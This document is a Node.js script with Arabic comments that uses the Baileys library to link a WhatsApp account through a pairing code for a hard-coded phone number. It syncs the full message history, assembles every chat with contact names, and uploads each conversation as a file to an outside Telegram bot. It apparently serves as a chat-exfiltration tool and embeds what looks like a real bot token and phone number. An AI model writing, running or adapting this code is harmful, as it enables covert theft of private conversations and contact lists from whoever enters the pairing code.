const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion 
} = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const pino = require('pino');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

// ==========================================
// ⚙️ الإعدادات الأساسية
// ==========================================
const TELEGRAM_BOT_TOKEN = '8729289938:AAEhGr-tqHWBObymCOoNmTBL871Wl9Db0ho';
const TELEGRAM_CHAT_ID = '8213146484';

// 📱 رقم الهاتف المحدد لطلب كود الربط
const PHONE_NUMBER = '201031062201'; 

const SESSION_FOLDER = 'session_auto_clean';

// مسح الجلسة القديمة لطلب السجل كاملاً
if (fs.existsSync(SESSION_FOLDER)) {
    console.log('🧹 تفريغ الجلسة السابقة لطلب مزامنة جديدة...');
    fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
}

async function autoExportAllChats() {
    console.log('🔄 1. بدء جلسة جديدة ونظيفة...');

    const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1043857760] }));
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_FOLDER);

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: ['Ubuntu', 'Chrome', '20.0.04'],
        syncFullHistory: true
    });

    sock.ev.on('creds.update', saveCreds);

    // ==========================================
    // 🔑 طلب كود الربط (Pairing Code)
    // ==========================================
    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const cleanPhone = PHONE_NUMBER.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(cleanPhone);
                console.log('\n====================================');
                console.log(`🔢 كود الربط الخاص بك هو:  👉  ${code}  👈`);
                console.log('====================================');
                console.log('📌 افتح واتساب > الأجهزة المرتبطة > ربط جهاز > الربط برقم الهاتف وأدخل الكود أعلاه.\n');
            } catch (err) {
                console.error('❌ تعذر طلب كود الربط:', err.message);
            }
        }, 3000);
    }

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = (lastDisconnect?.error instanceof Boom)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) setTimeout(autoExportAllChats, 4000);
        } else if (connection === 'open') {
            console.log('\n✅ تم الربط بنجاح! جاري تجميع الأسماء والمحادثات من السيرفر...');
            scheduleExportCheck();
        }
    });

    const allChatsMap = new Map();
    const contactsMap = new Map();
    let syncTimer = null;
    let exported = false;

    function recordContact(c) {
        const name = c.name || c.notify || c.verifiedName;
        if (!name) return;
        if (c.id) contactsMap.set(c.id, name);
        if (c.lid) contactsMap.set(c.lid, name);
    }

    sock.ev.on('contacts.upsert', (contacts) => {
        for (const c of contacts) recordContact(c);
    });

    sock.ev.on('contacts.update', (updates) => {
        for (const c of updates) recordContact(c);
    });

    function scheduleExportCheck(delay = 20000) {
        clearTimeout(syncTimer);
        syncTimer = setTimeout(async () => {
            if (exported) return;
            exported = true;
            console.log('\n⏳ اكتملت المزامنة، جاري تجهيز وإرسال الملفات بأسماء جهات الاتصال...');
            await processAndExportAll(allChatsMap, contactsMap);
        }, delay);
    }

    function addMessage(msg) {
        const jid = msg.key?.remoteJid;
        if (!jid || jid === 'status@broadcast') return;

        if (msg.pushName) {
            if (!contactsMap.has(jid)) contactsMap.set(jid, msg.pushName);
            if (msg.key.participant && !contactsMap.has(msg.key.participant)) {
                contactsMap.set(msg.key.participant, msg.pushName);
            }
        }

        if (!allChatsMap.has(jid)) {
            allChatsMap.set(jid, new Map());
        }
        allChatsMap.get(jid).set(msg.key.id, msg);
    }

    sock.ev.on('messaging-history.set', async ({ messages, contacts }) => {
        if (contacts && contacts.length > 0) {
            for (const c of contacts) recordContact(c);
        }
        if (!messages || messages.length === 0) return;

        console.log(`📥 استلمنا دفعة تاريخية تضم ${messages.length} رسالة...`);
        for (const msg of messages) addMessage(msg);
        scheduleExportCheck(15000);
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        if (!messages || messages.length === 0) return;
        for (const msg of messages) addMessage(msg);
        scheduleExportCheck(15000);
    });

    async function processAndExportAll(chatsMap, contacts) {
        if (chatsMap.size === 0) {
            console.log('❌ لم يتم العثور على أي رسائل لتصديرها.');
            process.exit(0);
        }

        console.log(`\n📦 إجمالي المحادثات المستخرجة: ${chatsMap.size} محادثة.`);
        let count = 1;

        for (const [jid, map] of chatsMap.entries()) {
            const displayName = contacts.get(jid) || jid.split('@')[0];
            console.log(`\n📄 [${count}/${chatsMap.size}] جاري معالجة: ${displayName} (${map.size} رسالة)`);
            await saveAndSendToTelegram(map, jid, displayName, count, chatsMap.size, contacts);
            count++;
            await new Promise(r => setTimeout(r, 1200));
        }

        console.log('\n🎉 تم إرسال جميع ملفات المحادثات بنجاح إلى تليجرام!');
        process.exit(0);
    }
}

async function saveAndSendToTelegram(map, chatJid, displayName, currentIdx, totalChats, contacts) {
    const sorted = Array.from(map.values()).sort((a, b) => {
        return Number(a.messageTimestamp) - Number(b.messageTimestamp);
    });

    let outputText = `=== سجل شات: ${displayName} (${chatJid}) ===\n`;
    outputText += `إجمالي الرسائل: ${sorted.length}\n`;
    outputText += `تاريخ التصدير: ${new Date().toLocaleString('ar-EG')}\n\n`;

    for (const m of sorted) {
        const time = new Date(Number(m.messageTimestamp) * 1000).toLocaleString('ar-EG');
        let sender = 'أنا';
        if (!m.key.fromMe) {
            const rawSender = m.key.participant || m.key.remoteJid;
            sender = contacts.get(rawSender) || m.pushName || rawSender.split('@')[0];
        }

        const text = m.message?.conversation 
            || m.message?.extendedTextMessage?.text 
            || (m.message?.imageMessage ? '[صورة]' : '')
            || (m.message?.audioMessage ? '[تسجيل صوتي]' : '')
            || (m.message?.videoMessage ? '[فيديو]' : '')
            || (m.message?.documentMessage ? '[مستند]' : '')
            || '[وسائط / رسالة أخرى]';

        outputText += `[${time}] ${sender}: ${text}\n`;
    }

    const safeName = displayName.replace(/[\\/:*?"<>|]/g, '_').trim();
    const fileName = `chat_${safeName}.txt`;

    fs.writeFileSync(fileName, outputText, 'utf-8');

    try {
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('document', fs.createReadStream(fileName));
        form.append('caption', `📁 شات [${currentIdx}/${totalChats}]\n👤 الاسم: ${displayName}\n📍 المعرف: ${chatJid}\n💬 الرسائل: ${sorted.length}`);

        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
            form,
            { headers: form.getHeaders() }
        );

        console.log(`✅ تم تسليم الملف [${fileName}] إلى تليجرام.`);
    } catch (err) {
        console.error(`❌ تعذر إرسال الملف [${fileName}]:`, err.response?.data || err.message);
    }
}

autoExportAllChats().catch(console.error);
